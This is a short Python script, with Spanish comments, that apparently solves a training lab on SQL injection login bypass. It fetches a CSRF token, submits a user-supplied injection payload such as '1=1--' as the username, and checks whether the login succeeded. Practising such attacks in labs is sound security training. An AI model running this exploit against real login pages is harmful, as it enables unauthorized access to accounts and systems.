# Lab: SQL injection vulnerability allowing login bypass
# APPRENTICE

# This lab contains a SQL injection vulnerability in the login function.
# To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) #Elimina el mensaje que que https no tiene certificado 

proxy = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url + "/login", verify=False, proxies=proxy)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit_bypasslogin(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf,
            "username": payload,
            "password": "noimportaquehayaqui"}
    r = s.post(url + "/login", data=data, verify=False, proxies=proxy)
    res = r.text
    if "Log out" in res: #el texto "Log out" aparece solo si se ha iniciado sessión con exito
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except:
        print('[-] Uso: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Ejemplo: %s www.ejemplo.com "1=1--"' % sys.argv[0])

    s = requests.Session()

    if exploit_bypasslogin(s, url, sqli_payload):
        print('[+] SQLi Bypass Inicio de sessión exitoso')
    else:
        print('[+] SQLi Bypass Inicio de sessión fallido')